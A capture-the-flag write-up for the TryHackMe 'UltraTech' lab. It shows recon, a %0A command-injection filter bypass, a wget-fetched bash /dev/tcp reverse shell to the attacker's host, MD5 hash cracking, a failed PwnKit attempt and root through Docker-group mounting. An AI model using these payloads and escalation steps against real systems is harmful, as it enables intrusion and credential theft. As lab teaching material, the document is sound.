# Writeup: UltraTech (TryHackMe)

**Target:** `10.114.149.147` (also `10.114.157.77`)
**OS:** Ubuntu Linux

---

## 1. Reconnaissance

### 1.1 Nmap — Port Scanning

Run a scan with service version detection and default scripts:

```bash
sudo nmap -sC -sV 10.114.149.147
```

**What the command does:**
- `-sC` — runs the default set of NSE scripts (banners, headers, basic checks).
- `-sV` — detects service versions on open ports.
- `10.114.149.147` — target IP.

**Result:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 8081/tcp | HTTP | Node.js Express framework (UltraTech API v0.1.3) |
| 31331/tcp | HTTP | (main website, Apache) |

**What this means:**
- **21/tcp (FTP)** — file server. Not touching it yet, but keeping it in mind (anonymous access? weak creds?).
- **22/tcp (SSH)** — entry point for users. We'll come back here later with found credentials.
- **8081/tcp** — REST API on Node.js Express. The `UltraTech API v0.1.3` header confirms it's an API.
- **31331/tcp** — main website (Apache). This is what we'll investigate first.

A full port scan (`-p-`) confirms there are no other open ports.

### 1.2 Web Reconnaissance

**Main website (port 31331):**

First, check `robots.txt` — a standard file that often contains hints about hidden paths:

```bash
http://10.114.149.147:31331/robots.txt
```

**Contents:**

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

**What this means:**
- `Allow: *` — robots are allowed everywhere.
- `Sitemap: /utech_sitemap.txt` — points to a sitemap file. This is a hint: it may list pages.

Follow the indicated path:

```bash
http://10.114.149.147:31331/utech_sitemap.txt
```

**Contents:**

```
/
/index.html
/what.html
/partners.html
```

**What this means:**
- The site's pages are listed: main page, `what.html`, `partners.html`.
- Most likely, one of them (or the JS files) contains code that talks to the API on port 8081.

**API (port 8081):**

Open the API root:

```bash
http://10.114.149.147:8081
```

**Response:**

```
UltraTech API v0.1.3
```

**What this means:** the API is running, version 0.1.3. Next, we need to find its endpoints.

**Directory brute-force (ffuf/dirb):**

```bash
ffuf -u http://10.114.149.147:8081/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
```

**What the command does:**
- `-u` — URL with the `FUZZ` marker where wordlist entries are substituted.
- `-w` — path wordlist.
- `-mc 200` — show only responses with status 200 (existing paths).

**Result:**

| Endpoint | Status | Description |
|----------|--------|-------------|
| `/auth` | 200 | Requires login + password |
| `/ping` | 200 | Accepts an `ip` parameter |

**What this means:**
- `/auth` — authentication endpoint. Login and password are sent here.
- `/ping` — an endpoint that, judging by the name, "pings" the supplied IP. This is a classic command injection point if the `ip` parameter is passed into a system command.

---

## 2. Analyzing the Link Between the Website and the API

**Why this matters:** the website on port 31331 is the frontend, and the API on 8081 is the backend. We need to understand how they communicate to find an entry point.

**How to look:**
1. Open the site's pages (`/`, `/what.html`, `/partners.html`) and view the source (Ctrl+U).
2. Look for included JavaScript files (e.g., `api.js`, `app.js`).
3. In the JS code, look for requests to `http://<IP>:8081/...`.

**What we find:** the login form on the site sends a request to `http://<IP>:8081/auth`, and the check function goes to `/ping?ip=...`.

**Key takeaway:** the `ip` parameter in `/ping` is passed into a system `ping` command. If the server doesn't filter input — **command injection** is possible.

---

## 3. Exploitation: Command Injection

### 3.1 Testing for Injection

**Idea:** if the server executes something like `ping -c 4 <ip>`, then by adding a special separator character, we can execute our own command.

**Trying different separators:**

| Separator | Payload | Result |
|-----------|---------|--------|
| `;` | `127.0.0.1; id` | didn't work (filtered) |
| `\|` | `127.0.0.1 \| id` | didn't work |
| `\|\|` | `127.0.0.1 \|\| id` | didn't work |
| `&&` | `127.0.0.1 && id` | didn't work |
| `$()` | `127.0.0.1 $(id)` | `/bin/sh` syntax error |
| **`%0A`** | `127.0.0.1%0Aid` | ✅ **worked** |

**What `%0A` is:** it's the URL-encoded newline character (`\n`). The shell treats it as a command separator — just like `;`. But the filter that blocks `;`, `|`, `&&`, `$` **does not check** `%0A`.

**Request:**

```
GET /ping?ip=10.114.149.147%0Aid HTTP/1.1
```

**Response:**

```
PING 10.114.149.147 (10.114.149.147) 56(84) bytes of data.
64 bytes from 10.114.149.147: icmp_seq=1 ttl=64 time=0.047 ms
...
uid=1002(www) gid=1002(www) groups=1002(www)
```

**What this means:**
- The server executed `ping 10.114.149.147`, then — `id`.
- We got user `www` (uid=1002).
- Injection works.

**Why `;` didn't work but `%0A` did:** the filter likely checks the string for `;`, `|`, `&`, `$`, `(`, `)`, but doesn't check the newline character. For the shell, `\n` is a full-fledged command separator.

### 3.2 Getting a Reverse Shell

**Problem:** the direct payload `bash -i >& /dev/tcp/192.168.128.18/4444 0>&1` doesn't work in `/bin/sh` (dash) — `/dev/tcp` is supported only in bash.

**Solution:** upload a script to the target and run it via `bash`.

**Step 1. Create `shell.sh` on Kali:**

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.128.18/4444 0>&1
```

**What the script does:**
- `bash -i` — interactive bash.
- `>& /dev/tcp/192.168.128.18/4444` — redirects stdout and stderr to a TCP connection to our IP on port 4444.
- `0>&1` — redirects stdin there too.

**Step 2. Start an HTTP server on Kali:**

```bash
python3 -m http.server 80
```

**What it does:** starts a simple HTTP server on port 80 so the target can download `shell.sh`.

**Step 3. Upload the script to the target via injection:**

```
GET /ping?ip=10.114.149.147%0Awget%20http://192.168.128.18/shell.sh%20-O%20/tmp/shell.sh HTTP/1.1
```

**What this means:**
- `%0A` — separator (newline).
- `wget http://192.168.128.18/shell.sh -O /tmp/shell.sh` — downloads the script from our server to `/tmp/shell.sh` on the target.
- `%20` — spaces.

**Check:** the `python3 -m http.server 80` window should show `GET /shell.sh 200`.

**Step 4. Start a listener on Kali:**

```bash
nc -lvnp 4444
```

**What it does:**
- `-l` — listen mode.
- `-v` — verbose.
- `-n` — don't resolve DNS.
- `-p 4444` — port 4444.

**Step 5. Run the script on the target:**

```
GET /ping?ip=10.114.149.147%0Abash%20/tmp/shell.sh HTTP/1.1
```

**What this means:** the server executes `bash /tmp/shell.sh`, the script establishes a TCP connection to our `nc`, and we get a shell.

**Result in `nc`:**

```
connect to [192.168.128.18] from (UNKNOWN) [10.114.157.77] 49376
bash: cannot set terminal process group (1184): Inappropriate ioctl for device
bash: no job control in this shell
www@ip-10-114-157-77:~/api$
```

**What this means:**
- Connection established.
- Warnings `cannot set terminal process group` and `no job control` are **not errors** — they're a consequence of no TTY. The shell works, but without tab completion or history.

### 3.3 Stabilizing the TTY

**Why:** a "raw" shell is fragile — it can die on parent process loss or timeout. We need a full interactive terminal.

**Step 1. In the obtained shell, run:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**What it does:** creates a pseudo-terminal (PTY) and runs bash inside it. Now the shell is more stable.

**Step 2. Press `Ctrl+Z`** — this suspends the current process and returns us to the local Kali terminal.

**Step 3. In the local Kali terminal, run:**

```bash
stty raw -echo; fg
```

**What it does:**
- `stty raw -echo` — puts the local terminal into "raw" mode (no special character processing) and disables echo.
- `fg` — brings the suspended process (our shell) back to the foreground.

**Step 4. Press Enter.** Now we have a full interactive terminal: `Ctrl+C`, arrows, tab completion all work.

### 3.4 Attempting Privilege Escalation via PwnKit (CVE-2021-4034)

**Idea:** PwnKit is a local privilege escalation vulnerability in `pkexec` (part of polkit), affecting most Linux distributions. If `pkexec` is present and SUID-root, it can be exploited to gain root. Since we already have a shell as `www`, this is a natural next step to try.

**Step 1. Download the PwnKit exploit to the target:**

On Kali, host the compiled exploit:

```bash
python3 -m http.server 1235
```

On the target (via the reverse shell):

```bash
cd /tmp
wget http://192.168.128.18:1235/PwnKit
chmod +x PwnKit
```

**What this does:** downloads the PwnKit binary to `/tmp` and makes it executable.

**Step 2. Run the exploit:**

```bash
./PwnKit
```

**Result:**

```
Failed to copy file: File exists
```

**What this means:** the exploit creates a `GCONV_PATH=.` directory and a `.pkexec` file during execution. On the first run, these artifacts were left behind. On subsequent runs, the exploit fails because it cannot overwrite the existing files.

**Step 3. Clean up and retry:**

```bash
rm -rf "GCONV_PATH=." .pkexec
./PwnKit
```

**Result:** the exploit runs silently and exits. Checking `id`:

```bash
id
```

```
uid=1002(www) gid=1002(www) groups=1002(www)
```

**What this means:** PwnKit did **not** escalate privileges. The exploit failed silently — no root shell was obtained.

**Step 4. Try an alternative directory (`/dev/shm`):**

```bash
cp /tmp/PwnKit /dev/shm/
cd /dev/shm
chmod +x PwnKit
./PwnKit
id
```

**Result:** still `uid=1002(www)`. PwnKit fails here as well.

**Why PwnKit didn't work:**
- The exploit may be blocked by `noexec` on `/tmp` or `/dev/shm`.
- The specific PwnKit PoC may have a flawed `GCONV_PATH` injection logic in this environment.
- `pkexec` may be patched or absent.

**Key takeaway:** PwnKit is a dead end on this box. Don't get stuck on it — move on to the standard path: extract credentials from the SQLite database and escalate via Docker.

---

## 4. Post-Exploitation: Database

**Where to look:** we're already in `/home/www/api/` (visible from the shell prompt). List the contents:

```bash
ls -la
```

**What we see:** `index.js`, `node_modules`, `package.json`, `start.sh`, `utech.db.sqlite`.

**What this means:** `utech.db.sqlite` is an SQLite database. It likely stores user credentials.

**Read the database:**

```bash
cat /home/www/api/utech.db.sqlite
```

**What it does:** dumps the entire file contents to the terminal. SQLite is a binary format, but text data (table names, logins, hashes) is visible.

**Result:**

```
CREATE TABLE users (
    login Varchar,
    password Varchar,
    type Int
);

r00t  → f357a0c52799563c7c7b76c1e7543a32
admin → 0d0ea5111e3c1def594c1684e3b9be84
```

**What this means:**
- Table `users` with fields `login`, `password`, `type`.
- Two users: `r00t` and `admin`.
- Passwords are stored as MD5 hashes (32 hex characters).

### 4.1 Cracking MD5 Hashes

**Why MD5:** 32-character hashes are MD5. It's unsalted, so it's vulnerable to dictionary attacks.

**Step 1. Save the hash to a file:**

```bash
echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt
```

**What it does:** writes the hash to `hash.txt` (John requires a file, not a string argument).

**Step 2. Run John the Ripper:**

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**What it does:**
- `--format=raw-md5` — explicitly specifies the format (raw MD5, no salt).
- `--wordlist` — the `rockyou.txt` wordlist (standard password dictionary).
- `hash.txt` — file with the hash.

**Result:**

```
r00t : n100906
```

**What this means:** the password for user `r00t` is `n100906`. Now we can log in via SSH.

**The `admin` hash** (`0d0ea5111e3c1def594c1684e3b9be84`) also cracks, but it's not required for completion — the main path is through `r00t`.

---

## 5. Privilege Escalation: SSH → Docker → root

### 5.1 SSH Login

**Why:** we have `r00t` credentials, and SSH is open on port 22. Log in:

```bash
ssh r00t@10.114.149.147
```

**What it does:** establishes an SSH connection to the target as user `r00t`.

**Password:** `n100906`.

### 5.2 Checking Groups

**Why:** after login, we need to understand what privileges the user has. This is the key to privilege escalation.

```bash
id
```

**What it does:** shows the current user's uid, gid, and all groups.

**Result:**

```
uid=1000(r00t) gid=1000(r00t) groups=1000(r00t),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1001(docker)
```

**What this means:**
- `r00t` is in the **`docker`** group.
- Membership in the `docker` group is effectively equivalent to root access: you can run containers and mount the host filesystem.

### 5.3 Docker Exploitation

**Idea:** the Docker daemon runs as root. A user in the `docker` group can run containers that execute with root privileges. If you mount the host root `/` into the container and then switch the root (`chroot`) to that mounted directory — you get root access to the host filesystem.

**Command:**

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

**Breakdown by part:**

| Part | What it does |
|------|--------------|
| `docker run` | Starts a new container |
| `-v /:/mnt` | Mounts the host root `/` into `/mnt` inside the container |
| `--rm` | Removes the container after exit (to avoid clutter) |
| `-it` | Interactive mode + pseudo-TTY |
| `bash` | Image (lightweight image with bash) |
| `chroot /mnt sh` | Changes root to `/mnt` (host root) and runs `sh` |

**What happens step by step:**
1. The Docker daemon (root) creates a container from the `bash` image.
2. The host `/` is mounted into `/mnt` in the container.
3. Inside the container, `chroot /mnt sh` is executed.
4. `chroot` changes the root to `/mnt` (host root) and runs `sh`.
5. We get a shell with root privileges **on the host filesystem**.

**Why this works:** the Docker daemon runs as root and doesn't restrict mounting `/` for users in the `docker` group. `chroot` simply makes us "stand" in the host root. Formally, we're still in a container, but with full access to the host.

### 5.4 Getting Root Access and the Flag

**Verify we're root:**

```bash
whoami
```

**Result:**

```
root
```

**Read the flag:**

```bash
cat /root/root.txt
```

**What this means:** we've obtained root access to the host and read the flag.

**Additionally:** you can extract the root private SSH key:

```bash
cat /root/.ssh/id_rsa
```

---

## 6. Final Chain

```
Nmap (21/22/8081/31331)
    ↓
robots.txt → utech_sitemap.txt
    ↓
API 8081: /auth, /ping
    ↓
Command Injection via %0A in /ping?ip=
    ↓
Reverse shell (www) → utech.db.sqlite
    ↓
MD5 hashes → john → r00t:n100906
    ↓
SSH as r00t → docker group
    ↓
docker run -v /:/mnt --rm -it bash chroot /mnt sh
    ↓
root on host → /root/root.txt
```

---

## 7. Key Lessons

1. **`%0A` (newline)** — a reliable bypass for command injection filters when `;`, `|`, `&&` are blocked. Filters often check only "standard" separators but forget about `\n`.
2. **`/bin/sh` ≠ `bash`**: `/dev/tcp` works only in bash. If the reverse shell doesn't work — explicitly call `bash -c` or upload a script and run it via `bash`.
3. **A reverse shell without a TTY is fragile** — stabilize it with `pty.spawn` + `stty raw -echo`, otherwise the shell may die on its own.
4. **SQLite database in plaintext** — `cat` is enough, no need to download. Unsalted MD5 hashes are cracked with a wordlist.
5. **The `docker` group = root**: mounting `/` into a container + `chroot` gives full host access. This is a classic privilege escalation vector.
6. **PwnKit (CVE-2021-4034)** can be a dead end — if it fails silently or throws `File exists`, don't get stuck. Clean up artifacts, try `/dev/shm`, and if it still doesn't work, move on to the standard path (docker).
